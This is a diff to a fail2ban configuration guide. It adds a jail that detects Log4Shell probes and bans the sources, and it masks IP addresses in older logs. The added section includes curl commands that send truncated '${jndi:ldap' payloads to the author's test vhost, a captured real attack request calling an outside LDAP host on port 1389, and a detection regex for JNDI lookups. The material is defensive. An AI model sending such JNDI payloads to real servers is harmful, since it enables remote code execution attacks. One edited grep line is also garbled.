@@ -8,6 +8,7 @@
 * https://github.com/fail2ban/fail2ban/wiki/Proper-fail2ban-configuration
 * https://github.com/fail2ban/fail2ban/wiki/Troubleshooting
 * [fail2ban 0.10 change log](https://github.com/fail2ban/fail2ban/blob/0.10/ChangeLog)
+* [fail2ban 0.11.2 change log](https://github.com/fail2ban/fail2ban/blob/0.11.2/ChangeLog)
 
 **Contents**
 
@@ -86,6 +87,170 @@ Status
 `- Jail list:   nginx-auth, nginx-auth-main, nginx-botsearch, nginx-common, nginx-conn-limit, nginx-get-f5, nginx-req-limit, nginx-req-limit-main, nginx-req-limit-repeat, nginx-xmlrpc, vbulletin, wordpress-auth, wordpress-comment, wordpress-fail2ban-plugin, wordpress-pingback, wordpress-pingback-repeat
 ```
 
+### log4j vulnerability filter action
+
+Test against Centmin Mod Nginx vhost created `log4j.domain.com`
+
+```
+domain=log4j.domain.com
+curl -A '${jndi:ldap' -skD - https://$domain
+curl -A '${jndi:ldap' -skD - https://$domain/log4j.html
+curl -A '${jndi:ldap' -Ik https://$domain
+curl -A '${jndi:ldap' -Ik https://$domain/log4j.html
+
+curl -X PUT -A '${jndi:ldap' -skD - https://$domain
+curl -X PUT -A '${jndi:ldap' -skD - https://$domain/log4j.html
+
+curl -X WHATEVER -A '${jndi:ldap' -skD - https://$domain
+curl -X WHATEVER -A '${jndi:ldap' -skD - https://$domain/log4j.html
+
+curl -A '${jndi:ldap' -skD - http://$domain
+curl -A '${jndi:ldap' -skD - http://$domain/log4j.html
+curl -A '${jndi:ldap' -Ik http://$domain
+curl -A '${jndi:ldap' -Ik http://$domain/log4j.html
+```
+
+Testing fail2ban regex for filter action `/etc/fail2ban/filter.d/nginx-log4j.conf`. Notice while testing, live request was logged for `/$%7Bjndi:ldap://45.xxx.xxx.xxx:1389/Exploit%7D` so readjusted my fail2ban filter action to account for it in future. Also regex accounts for attackers using invalid methods i.e. WHATEVER rather than just match on GET request methods.
+
+```
+fail2ban-regex "/home/nginx/domains/log4j.domain.com/log/access.log" /etc/fail2ban/filter.d/nginx-log4j.conf --print-all-matched
+
+Running tests
+=============
+
+Use   failregex filter file : nginx-log4j, basedir: /etc/fail2ban
+Use         log file : /home/nginx/domains/log4j.domain.com/log/access.log
+Use         encoding : UTF-8
+
+
+Results
+=======
+
+Failregex: 14 total
+|-  #) [# of hits] regular expression
+|   1) [14] ^<HOST> .*"(GET|HEAD|POST|PUT|PATCH|DELETE|.*).*\$?\{?jndi:(ldap[s]?|rmi|dns|\$\{lower).*
+`-
+
+Ignoreregex: 0 total
+
+Date template hits:
+|- [# of hits] date format
+|  [14] Day(?P<_sep>[-/])MON(?P=_sep)ExYear[ :]?24hour:Minute:Second(?:\.Microseconds)?(?: Zone offset)?
+`-
+
+Lines: 15 lines, 0 ignored, 15 matched, 0 missed
+[processed in 0.02 sec]
+
+|- Matched line(s):
+|  xxx.xxx.xxx.xxx - - [13/Dec/2021:05:16:57 +0000] "GET / HTTP/2.0" 200 6592 "-" "${jndi:ldap"
+|  xxx.xxx.xxx.xxx - - [13/Dec/2021:05:17:25 +0000] "GET / HTTP/2.0" 200 6592 "-" "${jndi:ldap"
+|  xxx.xxx.xxx.xxx - - [13/Dec/2021:05:19:09 +0000] "GET / HTTP/2.0" 200 6592 "-" "${jndi:ldap:"
+|  xxx.xxx.xxx.xxx - - [13/Dec/2021:05:19:11 +0000] "GET / HTTP/2.0" 200 6592 "-" "${jndi:ldap:"
+|  xxx.xxx.xxx.xxx - - [13/Dec/2021:05:21:16 +0000] "GET / HTTP/2.0" 200 6592 "-" "${jndi:ldap"
+|  xxx.xxx.xxx.xxx - - [13/Dec/2021:05:21:17 +0000] "GET / HTTP/2.0" 200 6592 "-" "${jndi:ldap"
+|  xxx.xxx.xxx.xxx - - [13/Dec/2021:05:23:17 +0000] "GET /log4j.html HTTP/2.0" 404 146 "-" "${jndi:ldap"
+|  xxx.xxx.xxx.xxx - - [13/Dec/2021:05:24:49 +0000] "HEAD / HTTP/1.1" 200 0 "-" "${jndi:ldap"
+|  112.74.52.90 - - [13/Dec/2021:05:29:12 +0000] "GET /$%7Bjndi:ldap://45.xxx.xxx.xxx:1389/Exploit%7D HTTP/1.1" 404 146 "-" "Mozilla/5.0 zgrab/0.x"
+|  xxx.xxx.xxx.xxx - - [13/Dec/2021:05:29:18 +0000] "PUT / HTTP/2.0" 405 150 "-" "${jndi:ldap"
+|  xxx.xxx.xxx.xxx - - [13/Dec/2021:05:37:16 +0000] "GET /log4j.html HTTP/2.0" 404 146 "-" "jndi:ldap"
+|  xxx.xxx.xxx.xxx - - [13/Dec/2021:05:40:57 +0000] "WHATEVER / HTTP/2.0" 405 150 "-" "${jndi:ldap"
+|  xxx.xxx.xxx.xxx - - [13/Dec/2021:05:40:59 +0000] "WHATEVER / HTTP/2.0" 405 150 "-" "${jndi:ldap"
+|  xxx.xxx.xxx.xxx - - [13/Dec/2021:05:44:51 +0000] "WHATEVER / HTTP/2.0" 405 150 "-" "${jndi:ldap"
+|  xxx.xxx.xxx.xxx - - [13/Dec/2021:05:48:01 +0000] "GET /log4j.html HTTP/1.1" 404 146 "-" "jndi:ldap"
+`-
+```
+
+From fail2ban log file
+
+```
+tail -100 /var/log/fail2ban.log  | tail -9
+2021-12-13 05:21:21,647 fail2ban.filter         [6610]: INFO    [nginx-log4j] Found xxx.xxx.xxx.xxx - 2021-12-13 05:21:16
+2021-12-13 05:21:21,647 fail2ban.filter         [6610]: INFO    [nginx-log4j] Found xxx.xxx.xxx.xxx - 2021-12-13 05:21:17
+2021-12-13 05:21:21,929 fail2ban.actions        [6610]: NOTICE  [nginx-log4j] Ban xxx.xxx.xxx.xxx
+2021-12-13 05:23:07,162 fail2ban.actions        [6610]: NOTICE  [nginx-log4j] Unban xxx.xxx.xxx.xxx
+2021-12-13 05:23:17,752 fail2ban.filter         [6610]: INFO    [nginx-log4j] Found xxx.xxx.xxx.xxx - 2021-12-13 05:23:17
+2021-12-13 05:23:18,294 fail2ban.actions        [6610]: NOTICE  [nginx-log4j] Ban xxx.xxx.xxx.xxx
+2021-12-13 05:24:46,329 fail2ban.actions        [6610]: NOTICE  [nginx-log4j] Unban xxx.xxx.xxx.xxx
+2021-12-13 05:24:49,502 fail2ban.filter         [6610]: INFO    [nginx-log4j] Found xxx.xxx.xxx.xxx - 2021-12-13 05:24:49
+2021-12-13 05:24:49,833 fail2ban.actions        [6610]: NOTICE  [nginx-log4j] Ban xxx.xxx.xxx.xxx
+```
+
+The relevant excerpt from `fail2ban.sh status` output
+
+```
+./fail2ban.sh status
+
+---------------------------------------
+nginx-log4j parameters: 
+maxretry: 1 findtime: 300 bantime: 86400
+allow rate: 288 hits/day
+filter last modified: Mon Dec 13 04:16:40 UTC 2021
+Status for the jail: nginx-log4j
+|- Filter
+|  |- Currently failed: 0
+|  |- Total failed:     1
+|  `- File list:        /home/nginx/domains/demodomain.com/log/access.log /home/nginx/domains/log4j.domain.com/log/access.log
+`- Actions
+   |- Currently banned: 1
+   |- Total banned:     1
+   `- Banned IP list:   xxx.xxx.xxx.xxx
+---------------------------------------
+nginx-log4j-main parameters: 
+maxretry: 1 findtime: 300 bantime: 86400
+allow rate: 288 hits/day
+filter last modified: Mon Dec 13 04:16:31 UTC 2021
+Status for the jail: nginx-log4j-main
+|- Filter
+|  |- Currently failed: 0
+|  |- Total failed:     0
+|  `- File list:        /var/log/nginx/localhost.access.log
+`- Actions
+   |- Currently banned: 0
+   |- Total banned:     0
+   `- Banned IP list:
+---------------------------------------
+All Time: Top 10 Banned IP Addresses:
+      1 xxx.xxx.xxx.xxx [nginx-log4j-main]
+      1 xxx.xxx.xxx.xxx [nginx-log4j]
+---------------------------------------
+All Time: Top 10 Restored Banned IP Addresses:
+---------------------------------------
+Yesterday: Top 10 Banned IP Addresses:
+---------------------------------------
+Yesterday: Top 10 Restored Banned IP Addresses:
+---------------------------------------
+Today: Top 10 Banned IP Addresses:
+      1 xxx.xxx.xxx.xxx [nginx-log4j-main]
+      1 xxx.xxx.xxx.xxx [nginx-log4j]
+---------------------------------------
+Today: Top 10 Restored Banned IP Addresses:
+---------------------------------------
+1 hr ago: Top 10 Banned IP Addresses:
+---------------------------------------
+1 hr ago: Top 10 Restored Banned IP Addresses:
+---------------------------------------
+```
+Debug output check for `nginx-log4j` filter action
+
+```
+fail2ban-client -d | grep "nginx-log4j'"
+['add', 'nginx-log4j', 'auto']
+['set', 'nginx-log4j', 'usedns', 'warn']
+['set', 'nginx-log4j', 'addfailregex', '^<HOST> .*"(GET|HEAD|POST|PUT|PATCH|DELETE|.*).*\\$?\\{?jndi:(ldap[s]?|rmi|dns|\\$\\{lower).*']
+['set', 'nginx-log4j', 'maxmatches', 1]
+['set', 'nginx-log4j', 'maxretry', 1]
+['set', 'nginx-log4j', 'addignoreip', '127.0.0.1/8', '::1', 'xxx.xxx.xxx.xxx', 'xxx.xxx.xxx.xxx']
+['set', 'nginx-log4j', 'logencoding', 'auto']
+['set', 'nginx-log4j', 'ignorecommand', '']
+['set', 'nginx-log4j', 'findtime', '300']
+['set', 'nginx-log4j', 'bantime', '86400']
+['set', 'nginx-log4j', 'addlogpath', '/home/nginx/domains/demodomain.com/log/access.log', 'head']
+['set', 'nginx-log4j', 'addlogpath', '/home/nginx/domains/log4j.domain.com/log/access.log', 'head']
+['set', 'nginx-log4j', 'addaction', 'csfdeny']
+['multi-set', 'nginx-log4j', 'action', 'csfdeny', [['actionunban', 'csf -dr <ip>'], ['actionban', 'csf -d <ip> Added by Fail2Ban for nginx-log4j'], ['actioncheck', ''], ['actionstop', ''], ['actionstart', ''], ['actname', 'csfdeny'], ['name', 'nginx-log4j']]]
+['start', 'nginx-log4j']
+```
+
 ### wordpress-auth filter action
 
 Lets test Wordpress failed login filter `wordpress-auth` with fail2ban and CSF Firewall. The default `jail.local` config for `wordpress-auth`
@@ -137,28 +302,28 @@ check fail2ban log for `wordpress-auth` entries
 ```
 tail -50 /var/log/fail2ban.log | grep wordpress-auth
 2017-05-13 06:14:14,216 fail2ban.jail           [12969]: INFO    Jail 'wordpress-auth' started
-2017-05-13 07:07:16,433 fail2ban.filter         [12969]: INFO    [wordpress-auth] Found 149.xxx.xxx.xxx - 2017-05-13 07:07:16
-2017-05-13 07:08:06,916 fail2ban.filter         [12969]: INFO    [wordpress-auth] Found 149.xxx.xxx.xxx - 2017-05-13 07:08:06
-2017-05-13 07:08:08,127 fail2ban.filter         [12969]: INFO    [wordpress-auth] Found 149.xxx.xxx.xxx - 2017-05-13 07:08:08
-2017-05-13 07:08:08,459 fail2ban.actions        [12969]: NOTICE  [wordpress-auth] Ban 149.xxx.xxx.xxx
-2017-05-13 07:08:09,365 fail2ban.filter         [12969]: INFO    [wordpress-auth] Found 149.xxx.xxx.xxx - 2017-05-13 07:08:09
-2017-05-13 07:08:10,578 fail2ban.filter         [12969]: INFO    [wordpress-auth] Found 149.xxx.xxx.xxx - 2017-05-13 07:08:10
-2017-05-13 07:08:12,005 fail2ban.filter         [12969]: INFO    [wordpress-auth] Found 149.xxx.xxx.xxx - 2017-05-13 07:08:11
-2017-05-13 07:08:12,132 fail2ban.actions        [12969]: NOTICE  [wordpress-auth] 149.xxx.xxx.xxx already banned
+2017-05-13 07:07:16,433 fail2ban.filter         [12969]: INFO    [wordpress-auth] Found xxx.xxx.xxx.xxx - 2017-05-13 07:07:16
+2017-05-13 07:08:06,916 fail2ban.filter         [12969]: INFO    [wordpress-auth] Found xxx.xxx.xxx.xxx - 2017-05-13 07:08:06
+2017-05-13 07:08:08,127 fail2ban.filter         [12969]: INFO    [wordpress-auth] Found xxx.xxx.xxx.xxx - 2017-05-13 07:08:08
+2017-05-13 07:08:08,459 fail2ban.actions        [12969]: NOTICE  [wordpress-auth] Ban xxx.xxx.xxx.xxx
+2017-05-13 07:08:09,365 fail2ban.filter         [12969]: INFO    [wordpress-auth] Found xxx.xxx.xxx.xxx - 2017-05-13 07:08:09
+2017-05-13 07:08:10,578 fail2ban.filter         [12969]: INFO    [wordpress-auth] Found xxx.xxx.xxx.xxx - 2017-05-13 07:08:10
+2017-05-13 07:08:12,005 fail2ban.filter         [12969]: INFO    [wordpress-auth] Found xxx.xxx.xxx.xxx - 2017-05-13 07:08:11
+2017-05-13 07:08:12,132 fail2ban.actions        [12969]: NOTICE  [wordpress-auth] xxx.xxx.xxx.xxx already banned
 ```
 
-check CSF Firewall grep the banned ip 149.xxx.xxx.xxx - notice the note for `Added by Fail2Ban for wordpress-auth`
+check CSF Firewall grep the banned ip xxx.xxx.xxx.xxx - notice the note for `Added by Fail2Ban for wordpress-auth`
 
 ```
-csf -g 149.xxx.xxx.xxx                                         
+csf -g xxx.xxx.xxx.xxx                                         
 
 Chain            num   pkts bytes target     prot opt in     out     source               destination         
-No matches found for 149.xxx.xxx.xxx in iptables
+No matches found for xxx.xxx.xxx.xxx in iptables
 
 
-IPSET: Set:chain_DENY Match:149.xxx.xxx.xxx Setting: File:/etc/csf/csf.deny
+IPSET: Set:chain_DENY Match:xxx.xxx.xxx.xxx Setting: File:/etc/csf/csf.deny
 
-csf.deny: 149.xxx.xxx.xxx # Added by Fail2Ban for wordpress-auth - Sat May 13 07:08:08 2017
+csf.deny: xxx.xxx.xxx.xxx # Added by Fail2Ban for wordpress-auth - Sat May 13 07:08:08 2017
 ```
 
 check the `wordpress-auth` jail status
@@ -173,7 +338,7 @@ Status for the jail: wordpress-auth
 `- Actions
    |- Currently banned: 1
    |- Total banned:     1
-   `- Banned IP list:   149.xxx.xxx.xxx
+   `- Banned IP list:   xxx.xxx.xxx.xxx
 ```
 
 ### nginx-req-limit filter action
@@ -572,24 +737,24 @@ fail2ban.sh status output now includes each jail's parameters for maxretry, find
       `- Banned IP list:
     ---------------------------------------
     All Time: Top 10 Banned IP Addresses:
-          4 149.xxx.xxx.xxx [nginx-req-limit]
+          4 xxx.xxx.xxx.xxx [nginx-req-limit]
           3 104.237.xxx.xxx [wordpress-pingback]
-          2 149.xxx.xxx.xxx [wordpress-auth]
-          2 149.xxx.xxx.xxx [http-xensec]
+          2 xxx.xxx.xxx.xxx [wordpress-auth]
+          2 xxx.xxx.xxx.xxx [http-xensec]
     ---------------------------------------
     All Time: Top 10 Restored Banned IP Addresses:
          25 104.237.xxx.xxx [wordpress-pingback]
-          2 149.xxx.xxx.xxx [nginx-req-limit]
+          2 xxx.xxx.xxx.xxx [nginx-req-limit]
     ---------------------------------------
     Yesterday: Top 10 Banned IP Addresses:
-          4 149.xxx.xxx.xxx [nginx-req-limit]
-          2 149.xxx.xxx.xxx [wordpress-auth]
-          2 149.xxx.xxx.xxx [http-xensec]
+          4 xxx.xxx.xxx.xxx [nginx-req-limit]
+          2 xxx.xxx.xxx.xxx [wordpress-auth]
+          2 xxx.xxx.xxx.xxx [http-xensec]
           2 104.237.xxx.xxx [wordpress-pingback]
     ---------------------------------------
     Yesterday: Top 10 Restored Banned IP Addresses:
          12 104.237.xxx.xxx [wordpress-pingback]
-          2 149.xxx.xxx.xxx [nginx-req-limit]
+          2 xxx.xxx.xxx.xxx [nginx-req-limit]
     ---------------------------------------
     Today: Top 10 Banned IP Addresses:
     ---------------------------------------
@@ -707,14 +872,14 @@ Ran Siege load testing again from separate server against `wp-login.php` to trig
     Longest transaction:            0.94
     Shortest transaction:           0.45
 
-Checking fail2ban log for `149.xxx.xxx.xxx`
+Checking fail2ban log for `xxx.xxx.xxx.xxx`
 
-    grep '149.xxx.xxx.xxx' /var/log/fail2ban.log | grep ' Ban '
-    2017-05-13 03:59:42,227 fail2ban.actions        [11201]: NOTICE  [nginx-req-limit] Ban 149.xxx.xxx.xxx
-    2017-05-13 04:02:04,713 fail2ban.actions        [11393]: NOTICE  [nginx-req-limit] Ban 149.xxx.xxx.xxx
-    2017-05-13 04:03:46,051 fail2ban.actions        [11524]: NOTICE  [nginx-req-limit] Restore Ban 149.xxx.xxx.xxx
-    2017-05-13 04:05:30,268 fail2ban.actions        [11665]: NOTICE  [nginx-req-limit] Restore Ban 149.xxx.xxx.xxx
-    2017-05-13 05:14:03,388 fail2ban.actions        [11665]: NOTICE  [nginx-req-limit] Ban 149.xxx.xxx.xxx
+    grep 'xxx.xxx.xxx.xxx' /var/log/fail2ban.log | grep ' Ban '
+    2017-05-13 03:59:42,227 fail2ban.actions        [11201]: NOTICE  [nginx-req-limit] Ban xxx.xxx.xxx.xxx
+    2017-05-13 04:02:04,713 fail2ban.actions        [11393]: NOTICE  [nginx-req-limit] Ban xxx.xxx.xxx.xxx
+    2017-05-13 04:03:46,051 fail2ban.actions        [11524]: NOTICE  [nginx-req-limit] Restore Ban xxx.xxx.xxx.xxx
+    2017-05-13 04:05:30,268 fail2ban.actions        [11665]: NOTICE  [nginx-req-limit] Restore Ban xxx.xxx.xxx.xxx
+    2017-05-13 05:14:03,388 fail2ban.actions        [11665]: NOTICE  [nginx-req-limit] Ban xxx.xxx.xxx.xxx
 
 Checking the `nginx-req-limit` filter status and regex
 
@@ -762,7 +927,7 @@ regex
     Lines: 92 lines, 0 ignored, 92 matched, 0 missed
     [processed in 0.02 sec]
 
-Checking Cloudflare's Firewall Access Rules for fail2ban inserted IP address starting with 149.xxx.xxx.xxx which is remote server I launced the Siege load test from
+Checking Cloudflare's Firewall Access Rules for fail2ban inserted IP address starting with xxx.xxx.xxx.xxx which is remote server I launced the Siege load test from
 
 ![](/screenshots/cloudflare-api/cloudflare-firewall-access-rules-01.png)
 
@@ -782,7 +947,7 @@ Test curl access from blocked server for `wp-login.php` url link gives 403 forbi
 
 Unbanning the ip from Cloudflare's Firewall Access Rules is same as before
 
-    fail2ban-client unban 149.xxx.xxx.xxx
+    fail2ban-client unban xxx.xxx.xxx.xxx
 
 fail2ban.sh status after latest test
 
@@ -796,7 +961,7 @@ fail2ban.sh status after latest test
     `- Actions
       |- Currently banned: 1
       |- Total banned:     2
-      `- Banned IP list:   149.xxx.xxx.xxx
+      `- Banned IP list:   xxx.xxx.xxx.xxx
     ---------------------------------------
     Status for the jail: nginx-auth
     |- Filter
@@ -856,7 +1021,7 @@ fail2ban.sh status after latest test
     `- Actions
       |- Currently banned: 1
       |- Total banned:     1
-      `- Banned IP list:   149.xxx.xxx.xxx
+      `- Banned IP list:   xxx.xxx.xxx.xxx
     ---------------------------------------
     Status for the jail: nginx-req-limit-main
     |- Filter
@@ -906,7 +1071,7 @@ fail2ban.sh status after latest test
     `- Actions
       |- Currently banned: 1
       |- Total banned:     1
-      `- Banned IP list:   149.xxx.xxx.xxx
+      `- Banned IP list:   xxx.xxx.xxx.xxx
     ---------------------------------------
     Status for the jail: wordpress-comment
     |- Filter
@@ -939,14 +1104,14 @@ fail2ban.sh status after latest test
       `- Banned IP list:
     ---------------------------------------
     All Time: Top 10 Banned IP Addresses:
-          4 149.xxx.xxx.xxx [nginx-req-limit]
-          2 149.xxx.xxx.xxx [wordpress-auth]
-          2 149.xxx.xxx.xxx [http-xensec]
+          4 xxx.xxx.xxx.xxx [nginx-req-limit]
+          2 xxx.xxx.xxx.xxx [wordpress-auth]
+          2 xxx.xxx.xxx.xxx [http-xensec]
           2 104.237.xxx.xxx [wordpress-pingback]
     ---------------------------------------
     All Time: Top 10 Restored Banned IP Addresses:
          16 104.237.xxx.xxx [wordpress-pingback]
-          2 149.xxx.xxx.xxx [nginx-req-limit]
+          2 xxx.xxx.xxx.xxx [nginx-req-limit]
     ---------------------------------------
     Yesterday: Top 10 Banned IP Addresses:
           1 104.237.xxx.xxx [wordpress-pingback]
@@ -955,17 +1120,17 @@ fail2ban.sh status after latest test
           5 104.237.xxx.xxx [wordpress-pingback]
     ---------------------------------------
     Today: Top 10 Banned IP Addresses:
-          4 149.xxx.xxx.xxx [nginx-req-limit]
-          2 149.xxx.xxx.xxx [wordpress-auth]
-          2 149.xxx.xxx.xxx [http-xensec]
+          4 xxx.xxx.xxx.xxx [nginx-req-limit]
+          2 xxx.xxx.xxx.xxx [wordpress-auth]
+          2 xxx.xxx.xxx.xxx [http-xensec]
           1 104.237.xxx.xxx [wordpress-pingback]
     ---------------------------------------
     Today: Top 10 Restored Banned IP Addresses:
          11 104.237.xxx.xxx [wordpress-pingback]
-          2 149.xxx.xxx.xxx [nginx-req-limit]
+          2 xxx.xxx.xxx.xxx [nginx-req-limit]
     ---------------------------------------
     1 hr ago: Top 10 Banned IP Addresses:
-          1 149.xxx.xxx.xxx [http-xensec]
+          1 xxx.xxx.xxx.xxx [http-xensec]
     ---------------------------------------
     1 hr ago: Top 10 Restored Banned IP Addresses:
           5 104.237.xxx.xxx [wordpress-pingback]
@@ -986,18 +1151,18 @@ For some simple troubleshooting steps for fail2ban jail testing, you can do the 
 
 `3.` Then search the /var/log/fail2ban.log log and grep filter on the IP address of attacking server for clues escaping dots . with backslashes
 
-    grep '149\.xxx\.xxx\.xxx' /var/log/fail2ban.log
+    grep 'xxx.\.xxx\.xxx\.xxx' /var/log/fail2ban.log
 
 example output
 
-    2017-08-21 15:02:10,728 fail2ban.filter         [2351]: INFO    [nginx-req-limit] Found 149.xxx.xxx.xxx - 2017-08-21 15:02:10
-    2017-08-21 15:02:10,728 fail2ban.failmanager    [2351]: DEBUG   Total # of detected failures: 5. Current failures from 1 IPs (IP:count): 149.xxx.xxx.xxx:5
-    2017-08-21 15:02:11,264 fail2ban.actions        [2351]: NOTICE  [nginx-req-limit] Ban 149.xxx.xxx.xxx
-    2017-08-21 15:02:11,264 fail2ban.action         [2351]: DEBUG   csf -d 149.xxx.xxx.xxx Added by Fail2Ban for nginx-req-limit
-    2017-08-21 15:02:11,269 fail2ban.filter         [2351]: DEBUG   Processing line with time:1503327731.0 and ip:149.xxx.xxx.xxx
-    2017-08-21 15:02:11,269 fail2ban.filter         [2351]: INFO    [nginx-req-limit-repeat] Found 149.xxx.xxx.xxx - 2017-08-21 15:02:11
-    2017-08-21 15:02:11,272 fail2ban.failmanager    [2351]: DEBUG   Total # of detected failures: 1. Current failures from 1 IPs (IP:count): 149.xxx.xxx.xxx:1
-    2017-08-21 15:02:12,249 fail2ban.utils          [2351]: DEBUG   25fee10 -- stdout: 'deny failed: 149.xxx.xxx.xxx is in the allow file /etc/csf/csf.allow'
+    2017-08-21 15:02:10,728 fail2ban.filter         [2351]: INFO    [nginx-req-limit] Found xxx.xxx.xxx.xxx - 2017-08-21 15:02:10
+    2017-08-21 15:02:10,728 fail2ban.failmanager    [2351]: DEBUG   Total # of detected failures: 5. Current failures from 1 IPs (IP:count): xxx.xxx.xxx.xxx:5
+    2017-08-21 15:02:11,264 fail2ban.actions        [2351]: NOTICE  [nginx-req-limit] Ban xxx.xxx.xxx.xxx
+    2017-08-21 15:02:11,264 fail2ban.action         [2351]: DEBUG   csf -d xxx.xxx.xxx.xxx Added by Fail2Ban for nginx-req-limit
+    2017-08-21 15:02:11,269 fail2ban.filter         [2351]: DEBUG   Processing line with time:1503327731.0 and ip:xxx.xxx.xxx.xxx
+    2017-08-21 15:02:11,269 fail2ban.filter         [2351]: INFO    [nginx-req-limit-repeat] Found xxx.xxx.xxx.xxx - 2017-08-21 15:02:11
+    2017-08-21 15:02:11,272 fail2ban.failmanager    [2351]: DEBUG   Total # of detected failures: 1. Current failures from 1 IPs (IP:count): xxx.xxx.xxx.xxx:1
+    2017-08-21 15:02:12,249 fail2ban.utils          [2351]: DEBUG   25fee10 -- stdout: 'deny failed: xxx.xxx.xxx.xxx is in the allow file /etc/csf/csf.allow'
 
 Then set log level back to info
 
